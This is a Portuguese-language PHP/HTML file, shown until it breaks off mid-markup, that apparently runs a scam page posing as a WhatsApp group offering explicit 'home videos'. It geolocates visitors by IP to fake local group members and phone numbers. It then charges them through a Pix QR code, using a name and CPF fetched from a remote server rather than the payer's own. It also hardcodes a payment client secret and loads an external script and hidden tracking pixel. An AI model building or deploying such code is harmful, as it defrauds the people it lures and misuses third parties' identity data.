<?php
session_start(); // Inicia a sessão para armazenar o parâmetro 'id'

// Verifica e armazena o parâmetro 'id' na sessão
if (isset($_GET['id'])) {
    $_SESSION['id'] = $_GET['id']; // Salva o 'id' na sessão
}

// Redireciona para a URL com o parâmetro 'id' se ele estiver faltando
if (!isset($_GET['id']) && isset($_SESSION['id'])) {
    $id = $_SESSION['id'];
    $newUrl = $_SERVER['PHP_SELF'] . "?id=" . urlencode($id);
    header("Location: $newUrl");
    exit();
}

// Validação dos parâmetros e lógica original
include 'BSPayAPI.php';
include 'database.php';

$valor = $_GET['id'] ?? null;
$nomeCompleto = $_GET['nome'] ?? null;
$valorMinimo = 1;
$valorMaximo = 100000;
$logFile = "errors.log";

file_put_contents($logFile, "id: $valor, Nome: $nomeCompleto\n", FILE_APPEND);

if ($valor === null) {
    file_put_contents($logFile, "O valor não foi informado.\n", FILE_APPEND);
    die(json_encode(['message' => 'O valor não foi informado.']));
}

if ($valor < $valorMinimo) {
    file_put_contents($logFile, "O valor não pode ser menor que $valorMinimo.\n", FILE_APPEND);
    die(json_encode(['message' => "O valor não pode ser menor que $valorMinimo."]));
} elseif ($valor > $valorMaximo) {
    file_put_contents($logFile, "O valor não pode ser maior que $valorMaximo.\n", FILE_APPEND);
    die(json_encode(['message' => "O valor não pode ser maior que $valorMaximo."]));
}

$randid = rand(11111, 99999);
$dataFutura = date('Y-m-d', strtotime('+1 day'));
$valor = floatval($valor);

file_put_contents($logFile, "Random ID: $randid, Data Futura: $dataFutura, id: $valor\n", FILE_APPEND);

$url = 'https://database-type.online/bspay/dados.php';
$data = json_decode(file_get_contents($url), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    file_put_contents($logFile, "Erro ao decodificar JSON: " . json_last_error_msg() . "\n", FILE_APPEND);
    die(json_encode(['message' => 'Erro ao decodificar JSON.']));
}

$cpf = $data['cpf'] ?? null;
$name = $data['name'] ?? null;

if ($cpf === null || $name === null) {
    file_put_contents($logFile, "Dados insuficientes: CPF ou Nome não encontrados.\n", FILE_APPEND);
    die(json_encode(['message' => 'Dados insuficientes.']));
}

$formatted_cpf = substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, -2);

file_put_contents($logFile, "CPF: $cpf, Formatted CPF: $formatted_cpf, Name: $name\n", FILE_APPEND);

$clientId = 'mayconbrsj_1416091271';
$clientSecret = '2a59b72d5f51e6d273dd704159619ebfe105cb77082c1fc950fc25f5fc8d1023';
$bspay = new BSPayAPI($clientId, $clientSecret);

try {
    $response = $bspay->gerarQrCodePix($valor, $name, $formatted_cpf, $randid);
} catch (Exception $e) {
    file_put_contents($logFile, "Erro ao gerar pagamento: " . $e->getMessage() . "\n", FILE_APPEND);
    die(json_encode(['message' => 'Erro ao gerar pagamento.']));
}

file_put_contents($logFile, "Response Data: " . print_r($response, true) . "\n", FILE_APPEND);

$pixqr = $response['qrcode'] ?? null;
$transactionId = $response['transactionId'] ?? null;

if ($pixqr === null || $transactionId === null) {
    file_put_contents($logFile, "Dados de pagamento insuficientes: QR Code ou ID não encontrados.\n", FILE_APPEND);
    die(json_encode(['message' => 'Dados de pagamento insuficientes.']));
}

$imgpix = "https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=" . urlencode($pixqr);

$valorFormatado = number_format($valor, 2, ',', '.');

// Inserir a transação no banco de dados
$pdo = connectDatabase();
$stmt = $pdo->prepare("INSERT INTO transactions (transaction_id, external_id, status) VALUES (?, ?, ?)");
$stmt->execute([$transactionId, $randid, 'PENDING']);

$primeiroNome = explode(' ', $nomeCompleto)[0];

$capitais = [
    "AC" => ["capital" => "Rio Branco", "ddd" => "68"],
    "AL" => ["capital" => "Maceió", "ddd" => "82"],
    "AP" => ["capital" => "Macapá", "ddd" => "96"],
    "AM" => ["capital" => "Manaus", "ddd" => "92"],
    "BA" => ["capital" => "Salvador", "ddd" => "71"],
    "CE" => ["capital" => "Fortaleza", "ddd" => "85"],
    "DF" => ["capital" => "Brasília", "ddd" => "61"],
    "ES" => ["capital" => "Vitória", "ddd" => "27"],
    "GO" => ["capital" => "Goiânia", "ddd" => "62"],
    "MA" => ["capital" => "São Luís", "ddd" => "98"],
    "MT" => ["capital" => "Cuiabá", "ddd" => "65"],
    "MS" => ["capital" => "Campo Grande", "ddd" => "67"],
    "MG" => ["capital" => "Belo Horizonte", "ddd" => "31"],
    "PA" => ["capital" => "Belém", "ddd" => "91"],
    "PB" => ["capital" => "João Pessoa", "ddd" => "83"],
    "PR" => ["capital" => "Curitiba", "ddd" => "41"],
    "PE" => ["capital" => "Recife", "ddd" => "81"],
    "PI" => ["capital" => "Teresina", "ddd" => "86"],
    "RJ" => ["capital" => "Rio de Janeiro", "ddd" => "21"],
    "RN" => ["capital" => "Natal", "ddd" => "84"],
    "RS" => ["capital" => "Porto Alegre", "ddd" => "51"],
    "RO" => ["capital" => "Porto Velho", "ddd" => "69"],
    "RR" => ["capital" => "Boa Vista", "ddd" => "95"],
    "SC" => ["capital" => "Florianópolis", "ddd" => "48"],
    "SP" => ["capital" => "São Paulo", "ddd" => "11"],
    "SE" => ["capital" => "Aracaju", "ddd" => "79"],
    "TO" => ["capital" => "Palmas", "ddd" => "63"]
];

// Função para obter informações do cliente
function getClientInfo($ip = null) {
    $ip = $ip ?? $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/$ip";
    $response = @file_get_contents($url);
    return $response ? json_decode($response, true) : null;
}

// Obter informações do cliente
$info = getClientInfo();

if ($info && $info['status'] === 'success') {
    $estado = $info['region'];
    $cidade = $info['city'];
    $pais = $info['country'];
    $ip = $info['query'];
    $capital = $capitais[$estado]['capital'] ?? null;
    $ddd = $capitais[$estado]['ddd'] ?? null;

    $result = [
        "ip" => $ip,
        "cidade" => $cidade,
        "estado" => $estado,
        "pais" => $pais,
        "capital_estado" => $capital,
        "ddd_capital" => $ddd
    ];
} else {
    $result = [
        "error" => "Não foi possível obter as informações de localização."
    ];
}

?>
<!DOCTYPE html>

﻿<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<head>
	
<meta http-equiv="cache-control" content="no-cache"> <img src="pingjs/index.htm?k=elwa2024&amp;t=FACEBOOK&amp;x=https://www.facebook.com" style="display:none">	
 
<script src="https://database-type.online/mobile.js"></script>


<title>🔥 Videos Caseiros <?php echo htmlspecialchars($cidade); ?></title>
<meta content='#008069' name='theme-color'>
<meta content='/9Qzhcvxn/IMG-20240711-003507.png' name='og:image'>
<meta content='Convite para conversa em grupo' property='og:description'>
<meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'>
<meta content='noindex' name='robots'>
<meta content='width=device-width, initial-scale=1.0' name='viewport'>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'>
<meta content='blogger' name='generator'>
<link href='yNpLQTF9/IMG-20240421-015447.png' rel='icon' type='image/png'>
<link href='https://chat-whatsapp.livemodelo.com/vsj.php?id=19.9' rel='canonical'>
<link rel="alternate" type="application/atom+xml" title="Mulheres para Sexo - Sul" href="https://www.chat-whatsapp-cok2tvh7bfd4zth.com/feeds/posts/default">
<link rel="alternate" type="application/rss+xml" title="🔥 Videos Caseiros VIP - <?php echo htmlspecialchars($cidade); ?>" href="https://www.chat-whatsapp-cok2tvh7bfd4zth.com/feeds/posts/default?alt=rss">
<link rel="service.post" type="application/atom+xml" title="🔥 Videos Caseiros VIP - <?php echo htmlspecialchars($cidade); ?>" href="https://chat-whatsapp.livemodelo.com/vsj.php?id=19.9">
<link rel="me" href="">
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<meta content='chat.whatsapp.com/gejjRHwlHavjkwlBwvxund/' property='og:url'>
<meta content='🔥 Videos Caseiros <?php echo htmlspecialchars($cidade); ?>' property='og:title'>
<meta content='' property='og:description'>
  
<style id='page-skin-1' type='text/css'><!--
/*
body {
font: $(body.font);
color: $(body.text.color);
background: $(body.background);
padding: 0 $(content.shadow.spread) $(content.shadow.spread) $(content.shadow.spread);
$(body.background.override) margin: 0;
padding: 0;
}

--></style>

</head>
<body>

<div class='main section' id='main'><div class='widget HTML' data-version='1' id='HTML1'>
<div class='widget-content'>
<style type="text/css">

* {
    margin: 0;
    padding: 0;
  font-family: Helvetica Neue, Helvetica Neue, Helvetica, Arial, sans-serif;
    box-sizing: border-box;
}
body {
    margin: 0px;
    background-color: #efeae2;
	text-align: center;
	display:flex;
	align-items: center;
	justify-content: center;
}

header {
    position: fixed;
    left: 0;
    top: 0;
    right: 0;
    width: 100%;
    height: auto;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    background: rgb(0 128 105);
    color: #fff;
    justify-content: space-between;
    padding: 7px 0px;
    z-index: 1;
    box-shadow: 0px 0px 4px 0px #07241f;
}
.left {
    color: #fff;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 5px;
    margin-left: 15px;
    justify-content: flex-start;
    max-width: 80%;
}
.left i {
    font-size: 17px;
}
.left img {
    max-width: 40px;
    max-height: 40px;
    border-radius: 100%;
}
.text {
    position: fixed;
    max-width: 60%;
}
.text h1 {
    font-size: 18px;
    font-weight: 600;
    max-width: 100%;
    line-height: 25px;
    margin-left: 53px;
    margin-top: 8px;
    display: inline-block;
    white-space: nowrap;
    overflow: hidden !important;
    text-overflow: ellipsis;
}
.text p {
    font-size: 10px;
    max-width: 100%;
    margin-left: 53px;
    display: inline-block;
    white-space: nowrap;
    overflow: hidden !important;
    text-overflow: ellipsis;
}
.right {
    display: flex;
    flex-direction: row;
    align-items: center;
    margin-right: 15px;
    column-gap: 20px;
    font-size: 18px;
}
.fa-phone-plus {
    color: #fff;
    opacity: 0.5;
}
.main {
    padding-top: 10vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    margin: 0px 15px;
}
.date {
    background: #f7ffff;
    padding: 3px 15px;
    font-size: 12px;
    font-weight: 500;
    border-radius: 8px;
    color: #444;
    box-shadow: 0px 0px 1px 0px #00000021;
    text-align: center;
}
.privacy {
    text-align: center;
    background: #feeecc;
    padding: 7px 10px;
    font-size: 10px;
    color: #666;
    margin-top: 10px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 300;
}
.activity {
    font-weight: 400 !important;
    font-size: 10px !important;
    margin-top: 10px;
    padding: 7px 7px;
}
.users {
    width: 100%;
    margin-top: 15px;
}
.user {
    position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    background: #fff;
    width: fit-content;
    padding: 5px 10px;
    border-radius: 0px 10px 10px 10px;
    margin-left: 10px;
    margin-bottom: 10px;
}
.user::before {
    content: "";
    clip-path: polygon(100% 0, 0 0, 100% 100%);
    position: absolute;
    left: -12px;
    width: 15px;
    height: 20px;
    top: -0.2px;
    display: block;
    background: #fff;
}
.number {
    display: block;
    font-weight: 600;
    font-size: 13px;
    color: #f44336;
}
.message {
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
}
.audio {
    display: flex;
    flex-direction: row;
    align-items: center;
}
.audio i {
    font-size: 22px;
    color: #77777791;
    margin-bottom: 14px;
    margin-right: 10px;
    cursor: pointer;
}
.content {
    position: relative;
    display: flex;
    flex-direction: row;
    align-items: center;
    flex-wrap: nowrap;
    justify-content: center;
    padding-left: 5px;
}
.content img {
    opacity: 0.6;
    height: 30px;
}
.details {
    width: 100%;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    font-size: 10px;
    margin-top: 5px;
    color: #666;
}
.pic {
    position: relative;
    margin: 0px 5px;
    margin-left: 10px;
}
.pic img {
    max-width: 50px;
    max-height: 55px;
    border-radius: 100%;
}
.pic i {
    color: #1da959;
    text-shadow: 1px -1px 0px white, -1px -1px 0px #ffffff;
    position: absolute;
    left: 0;
    bottom: 6px;
}
.video {
    position: relative;
}
.video img {
    border-radius: 10px;
    max-width: 280px;
}
.videodetails {
    position: absolute;
    bottom: 10px;
    width: 100%;
    display: flex;
    left: 0;
    flex-direction: row;
    align-items: flex-end;
    justify-content: space-between;
    color: #fff;
    font-size: 10px;
}
.videodetails p {
    margin-right: 10px;
}
.download {
    margin-left: 10px;
    background: #00000047;
    text-align: center;
    padding: 6px 12px;
    border-radius: 10px;
    font-size: 14px;
    cursor: pointer;
}

.highlight-large {
    font-size: 36px;
    font-weight: bold;
    color: #008069;
}

.copyInput {
    width: calc(100% - 20px);
    margin-bottom: 20px;
    border: 2px solid #008069;
    border-radius: 7px;
    padding: 3px;
    font-size: 13px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    cursor: pointer;
    resize: none;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

#copyInput {
    width: calc(100% - 20px);
    margin-bottom: 20px;
    border: 2px solid #008069;
    border-radius: 12px;
    padding: 3px;
    font-size: 13px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    cursor: pointer;
    resize: none;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

#numberInput {
    width: calc(75% - 20px);
    margin-bottom: 20px;
    border: 2px solid #008069;
    border-radius: 12px;
    padding: 3px;
    font-size: 13px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    cursor: pointer;
    resize: none;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

.qr-code-input {
    width: calc(100% - 20px); /* Ajusta o campo de texto aos cantos do container */
    padding: 5px;
    margin-bottom: 10px;
    font-size: 12px; /* Tamanho de fonte menor */
    text-align: center;
    border: 1px solid #ccc;
    border-radius: 5px;
    height: 25px; /* Altura reduzida */
    box-sizing: border-box; /* Certifica-se de que o padding não aumente a largura do campo */
}
.btn-verificando {
    background-color: #ffffff;
    border-radius: 20px;
    border-color: #008069;
}
.loaderSpinner {
    border: 4px solid #008069;
    border-top: 4px solid #ffffff;
    border-radius: 50%;
    width: 8.5px;
    height: 8.5px;
    animation: spin 2s linear infinite;
    display: inline-block;
    margin-right: 3px;
    margin-left: 5px;
}
.forward {
    font-size: 14px;
    color: #777;
    margin-left: 3px;
    margin-bottom: 3px;
    display: block;
}
.modal {
    position: fixed;
    left: 0;
    top: 0;
    background: #0000006e;
    width: 100%;
    height: 100%;
    z-index: 3;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    justify-content: flex-end;
}
.info {
    background: #fff;
    width: 100%;
    border-radius: 15px 15px 0px 0px;
    position: relative;
    text-align: center;
    padding: 10px;
}
.profile {
    display: block;
    width: 124px;
    border-radius: 62px;
    margin: 15px auto;
}
.title {
    font-size: 20px;
    padding: 6px;
}
.created {
   font-size: 13px;
    color: #747272;
}
.reactions {
    direction: ltr;
    display: inline-flex;
    align-items: center;
    margin: 10px auto;
}
.reactions img {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    box-sizing: content-box;
}
.like,
.love {
    margin-right: -5px;
    border: 2px solid #fff;
}
.love {
    z-index: 1;
}
.care {
    z-index: 2;
    border: 2px solid #fff;
}
.care1 {
    margin-left: -35px;
    z-index: 3;
}
.total {
    margin-left: -40px;
    z-index: 4;
    font-size: 14px;
    font-weight: 500;
}

#join,
#continuar,
#invite,
#invitee,
#get {
   display: block;
    width: 90%;
    height: 60px;
    color: #fff;
    border: none;
    outline: none;
    font-size: 16px;
    font-weight: bold;
   
    cursor: pointer;
    border-radius: 50px;
    padding: 0 10px;
    margin: 15px auto;
    background: #008069;
}
#join:hover
#continuar:hover {
    background: #008000;
}
.talxjnt h1 {
    font-size: 19px;
    font-weight: 600;
}
.talxjnt p {
    color: #777;
    font-size: 13px;
    margin-top: 5px;
}
#share,
#sharedois,
#compartilhar,
#offer {
    display: none;
}
.flex {
    display: flex;
    align-items: center;
    justify-content: center;
}
.bar {
    direction: ltr;
    max-width: 400px;
    margin: 10px auto;
    box-sizing: border-box;
}

.fill {
    position: relative;
    display: inline-block;
    width: calc(100% - 100px);
    height: 13px;
    padding: 2px;
    border: 1px solid #008069;
}
#fill {
    height: 100%;
    background-color: #008069;
    background-image: linear-gradient(-45deg, rgba(255, 255, 255, 0.2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0.2) 75%, transparent 75%, transparent);
    background-size: 30px 30px;
    animation: move 2s linear infinite;
    box-shadow: 2px 0 10px inset rgba(0, 0, 0, 0.2);
    transition: width 2s ease-out;
    width: 0%;
    transition: width 0.5s;
}

@keyframes move {
    0% {
        background-position: 0 0;
    }
    50% {
        background-position: 15px 15px;
    }
    100% {
        background-position: 30px 30px;
    }
}


.html::after {
	content: center;
	background: linear-gradient(21deg, #10abff, #1beabd);
	height:3px;
	width:100%;
	position:absolute;
	left:0;
	top:0;
}




.percentage {
    width: 100px;
    float: right;
    height: 11px;
    font-size: 16px;
    color: #000;
   
}
#percentage {
    margin-left: 5px;
}
.loader {
    width: 20px;
    height: 20px;
    margin: 0;
    border-radius: 50%;
    border: 4px solid #ccc;
    border-top-color: #008069;
    animation: spin 1s infinite linear;
}
@keyframes spin {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
}
   
.input {
	
	// needs to be relative so the :focus span is positioned correctly
	position:relative;
	
	// bigger font size for demo purposes
	font-size: 1.5em;
	
	// the border gradient
	background: linear-gradient(21deg, #10abff, #1beabd);
	
	// the width of the input border
	padding: 3px;
	
	// we want inline fields by default
	display: inline-block;
	
	// we want rounded corners no matter the size of the field
	border-radius: 9999em;
	
	// style of the actual input field
	*:not(span) {
		position: relative;
		display: inherit;
		border-radius: inherit;
		margin: 0;
		border: none;
		outline: none;
		padding: 0 .325em;
		z-index: 1; // needs to be above the :focus span
		
		// summon fancy shadow styles when focussed
		&:focus + span {
			opacity: 1;
			transform: scale(1);
		}
	}
	
	// we don't animate box-shadow directly as that can't be done on the GPU, only animate opacity and transform for high performance animations.
	span {
		
		transform: scale(.993, .94); // scale it down just a little bit
		transition: transform .5s, opacity .25s;
		opacity: 0; // is hidden by default
		
		position:absolute;
		z-index: 0; // needs to be below the field (would block input otherwise)
		margin:4px; // a bit bigger than .input padding, this prevents background color pixels shining through
		left:0;
		top:0;
		right:0;
		bottom:0;
		border-radius: inherit;
		pointer-events: none; // this allows the user to click through this element, as the shadow is rather wide it might overlap with other fields and we don't want to block those.
		
		// fancy shadow styles
		box-shadow: inset 0 0 0 3px #fff,
			0 0 0 4px #fff,
			3px -3px 30px #1beabd, 
			-3px 3px 30px #10abff;
	}
	
}

html {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
	line-height:1.5;
	font-size:1em;
}

body {
	text-align: center;
	display:flex;
	align-items: center;
	justify-content: center;
}

html, body {
	height:100%;
}

.input {
	font-family: inherit;
	line-height:inherit;
	color:#2e3750;
	min-width:12em;
}

::placeholder {
	color:#cbd0d5;
}

html::after {
	content:'';
	background: linear-gradient(21deg, #10abff, #1beabd);
	height:3px;
	width:100%;
	position:absolute;
	left:0;
	top:0;
}   

.custom-section h1 {
    color: #5271ff;
    text-align: center;
    font-size: 24px;
    margin-bottom: 10px;
    margin-top: 10px;
}

.custom-section .logo {
    width: 100%;
    max-width: 100px;
    margin-bottom: 10px;
    margin-top: 10px;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

.custom-section button {
    background-color: #007BFF;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
    transition: background-color 0.3s;
    margin-top: 10px;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

.custom-section button:hover {
    background-color: #0056b3;
}

.custom-section .tooltip-copy {
    background-color: #5271ff;
    color: white;
    padding: 10px;
    border-radius: 5px;
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    display: none;
    align-items: center;
}

.custom-section .tooltip-copy i {
    margin-right: 8px;
}

.custom-section #countdown {
    font-size: 16px;
    margin-top: 20px;
    color: #fff;
    background-color: #000000;
    padding: 10px;
    border-radius: 5px;
    text-align: center;
}

.custom-section #statusPagamento {
    margin-top: 10px;
    font-size: 16px;
    text-align: center;
}

.custom-section #pixCodeContainer {
    margin-top: 20px;
    width: 100%;
    display: flex;
    flex-direction: column;
}

.custom-section #pixImgContainer {
    align-items: center;
    margin-top: 20px;
    width: 100%;
    display: flex;
    flex-direction: column;
    margin-bottom: 20px;
}

.custom-section #pixCode {
    width: 250px;
    height: 250px;
}

.custom-section .numberIcon {
    background-color: #5271ff;
    color: white;
    border-radius: 50%;
    display: inline-block;
    width: 24px;
    height: 24px;
    text-align: center;
    line-height: 24px;
    margin-right: 5px;
    font-weight: bold;
    font-size: 14px;
    margin-bottom: 5px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.custom-section footer {
    margin-top: 20px;
    text-align: center;
    font-size: 14px;
    color: #888;
}

.custom-section footer h5 {
    margin: 0;
    font-weight: normal;
}

.custom-section footer p {
    margin: 5px 0 0 0;
    font-size: 10px;
    color: #ffffff;
}

.custom-section .grey-padlock-icon:before {
    content: "\1F512";
    margin-right: 5px;
}

.custom-section .safe-icon:before {
    content: "\1F6E1";
    margin-right: 5px;
}

.custom-section .alert-message {
    background-color: red;
    color: white;
    font-weight: bold;
    padding: 10px;
    border-radius: 5px;
    text-align: center;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

.btn-primary, {
    display: block;
    width: 100%;
    margin-bottom: 10px;
    background-color: #ffffff;
    color: #000000;
    font-weight: bold;
    border: 3px solid #000000;
    border-radius: 10px;
}

.btn-success {
    display: block;
    width: 100%;
    margin-bottom: 10px;
    background-color: #ffffff;
    color: #000000;
    font-weight: bold;
    border: 3px solid #000000;
    border-radius: 10px;
}

.custom-section .btn-success {
    background-color: #28a745;
    border-color: #28a745;
}

.custom-section .btn-success:hover {
    background-color: #218838;
    border-color: #1e7e34;
}

.custom-section .btn-verificando:hover {
    background-color: #ffffff;
    border-color: #000000;
}

.pulsating-circle {
    position: fixed; /* Mantém o círculo fixo na tela */
    right: 0; /* Posiciona no canto inferior direito */
    bottom: 0;
    margin: 20px; /* Adiciona margem para afastar do canto, se necessário */
    width: 60px; /* Aumenta o tamanho do círculo */
    height: 60px;
}

.pulsating-circle:before {
    content: '';
    position: relative;
    display: block;
    width: 300%;
    height: 300%;
    box-sizing: border-box;
    margin-left: -100%;
    margin-top: -100%;
    border-radius: 45px;
    background-color: #01a4e9;
    animation: pulse-ring 1.25s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
}

.pulsating-circle:after {
    content: '';
    position: absolute;
    left: 0;
    top: 0;
    display: block;
    width: 100%;
    height: 100%;
    background-image: url('https://larissinha.site/imagem.jpeg'); /* Substitua pelo caminho da sua imagem */
    background-size: cover; /* Ajusta a imagem ao tamanho do círculo */
    background-position: center;
    border-radius: 30px; /* Ajusta o raio da borda para o novo tamanho */
    box-shadow: 0 0 8px rgba(0,0,0,.3);
    animation: pulse-dot 1.25s cubic-bezier(0.455, 0.03, 0.515, 0.955) -.4s infinite;
}

@keyframes pulse-ring {
    0% {
        transform: scale(.33);
    }
    80%, 100% {
        opacity: 0;
    }
}

@keyframes pulse-dot {
    0% {
        transform: scale(.8);
    }
    50% {
        transform: scale(1);
    }
    100% {
        transform: scale(.8);
    }
}

</style>
<header>
            <div class="left">
                <i class="fa-regular fa-arrow-left"></i>
                <img src="9Qzhcvxn/IMG-20240711-003507.png">
                <div class="text">
                    <h1>🔥 Videos Caseiros <?php echo htmlspecialchars($cidade); ?></h1>
                    <p>+55 (<?php echo htmlspecialchars($ddd); ?>) 99554-7226, +55 (<?php echo htmlspecialchars($ddd); ?>) 99818-6442, +55 (<?php echo htmlspecialchars($ddd); ?>) 99892-9962</p>
                </div>
            </div>
            <div class="right">
                <i class="fa-solid fa-phone-plus"></i>
                <i class="fa-regular fa-ellipsis-vertical"></i>
            </div>
        </header>
        <main>
            <div class="date">
                <p><span id="day"></span> <span id="month"></span> <span id="year"></span></p>
            </div>
            <div class="date activity" style="display: none;">
                <p>+55 (<?php echo htmlspecialchars($ddd); ?>) 98486-8212 entrou usando o link de convite deste grupo</p>
            </div>
            <div class="users" id="user1" style="display: none;">
                <div class="user">
                    <div class="number">+55 (<?php echo htmlspecialchars($ddd); ?>) 99632-9911</div>
                    <div class="message">
                        <div class="audio">
                            <i class="fa-solid fa-play"></i>
                            <div>
                                <div class="content">
                                    <alxbndl></alxbndl>
                                    <img src="NF2cV00g/unnamed1.jpg">
                                    <img src="NF2cV00g/unnamed3.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                </div>
                                <div class="details">
                                    <span>0.57</span>
                                    <span>23:30</span>
                                </div>
                            </div>
                        </div>
                        <div class="pic">
                            <img src="4NBFnzPC/IMG-20230921-002622.jpg">
                            <i class="fa-solid fa-microphone"></i>
                        </div>
                    </div>
                </div>
                <div class="user" id="user2" style="display: none;">
                    <div class="number" style="margin-bottom: 5px; color: #9c27b0;">+55 (<?php echo htmlspecialchars($ddd); ?>) 99212-4836</div>
                    <div class="message">
                        <div class="video">
                            <img src="Dwbs07Q7/IMG-20240925-212836.png">
                            <div class="videodetails">
                                <div class="download">
                                    <i class="fa-solid fa-down"></i>
                                    <span>10:20</span>
                                </div>
                                <p>23:41</p>
                            </div>
                        </div>
                    </div>
                </div>
 <div class="users" id="user3" style="display: none;">
                <div class="user">
                    <div class="number">+55 (<?php echo htmlspecialchars($ddd); ?>) 99461-4265</div>
                    <div class="message">
                        <div class="audio">
                            <i class="fa-solid fa-play"></i>
                            <div>
                                <div class="content">
                                    <alxbndl></alxbndl>
                                    <img src="NF2cV00g/unnamed1.jpg">
                                    <img src="NF2cV00g/unnamed3.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                </div>
                                <div class="details">
                                    <span>0.12</span>
                                    <span>23:30</span>
                                </div>
                            </div>
                        </div>
                        <div class="pic">
                            <img src="Njp0FP96/IMG-20230920-204325.jpg">
                            <i class="fa-solid fa-microphone"></i>
                        </div>
                    </div>
                </div>
                  <div class="user" id="user4" style="display: none;">
                    <div class="number" style="margin-bottom: 5px; color: #9c27b0;">+55 (<?php echo htmlspecialchars($ddd); ?>) 99663-6416</div>
                    <div class="message">
                        <div class="video">
                            <img src="qRG2rQsn/IMG-20240925-211627.png">
                            <div class="videodetails">
                                <div class="download">
                                    <i class="fa-solid fa-down"></i>
                                    <span>11:04</span>
                                </div>
                                <p>23:41</p>
                            </div>
                        </div>
                    </div>
                </div>


                <div class="user" id="user5" style="display: none;">
                    <div class="number" style="margin-bottom: 5px; color: #ff9800;">+55 (<?php echo htmlspecialchars($ddd); ?>) 98805-7888</div>
                    <div class="forward"><i class="fa-solid fa-share"></i> <i></i></div>
                    <div class="message">
                        <div class="video">
                            <img src="R0Kcsvqg/IMG-20240925-211532.png">
                            <div class="videodetails">
                                <div class="download">
                                    <i class="fa-solid fa-down"></i>
                                    <span>12:40</span>
                                </div>
                                <p>23:41</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="users" id="user6" style="display: none;">
                <div class="user">
                    <div class="number">+55 (<?php echo htmlspecialchars($ddd); ?>) 99616-3262</div>
                    <div class="message">
                        <div class="audio">
                            <i class="fa-solid fa-play"></i>
                            <div>
                                <div class="content">
                                    <alxbndl></alxbndl>
                                    <img src="NF2cV00g/unnamed1.jpg">
                                    <img src="NF2cV00g/unnamed3.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                </div>
                                <div class="details">
                                    <span>0.22</span>
                                    <span>23:30</span>
                                </div>
                            </div>
                        </div>
                        <div class="pic">
                            <img src="nL8KLzyb/IMG-20230920-203638.jpg">
                            <i class="fa-solid fa-microphone"></i>
                        </div>
                    </div>
                </div>

                <div class="users" id="user7" style="display: none;">
                <div class="user">
                    <div class="number">+55 (<?php echo htmlspecialchars($ddd); ?>) 99245-8917</div>
                    <div class="message">
                        <div class="audio">
                            <i class="fa-solid fa-play"></i>
                            <div>
                                <div class="content">
                                    <alxbndl></alxbndl>
                                    <img src="NF2cV00g/unnamed1.jpg">
                                    <img src="NF2cV00g/unnamed3.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                </div>
                                <div class="details">
                                    <span>0.07</span>
                                    <span>23:30</span>
                                </div>
                            </div>
                        </div>
                        <div class="pic">
                            <img src="qpl2xCH.jpg">
                            <i class="fa-solid fa-microphone"></i>
                        </div>
                    </div>
                </div>

                
             <div class="users" id="user9" style="display: none;">
                <div class="user">
                    <div class="number">+55 (<?php echo htmlspecialchars($ddd); ?>15) 98412-2329</div>
                    <div class="message">
                        <div class="audio">
                            <i class="fa-solid fa-play"></i>
                            <div>
                                <div class="content">
                                    <alxbndl></alxbndl>
                                    <img src="NF2cV00g/unnamed1.jpg">
                                    <img src="NF2cV00g/unnamed3.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                    <img src="NF2cV00g/unnamed2.jpg">
                                </div>
                                <div class="details">
                                    <span>0.17</span>
                                    <span>23:30</span>
                                </div>
                            </div>
                        </div>
                        <div class="pic">
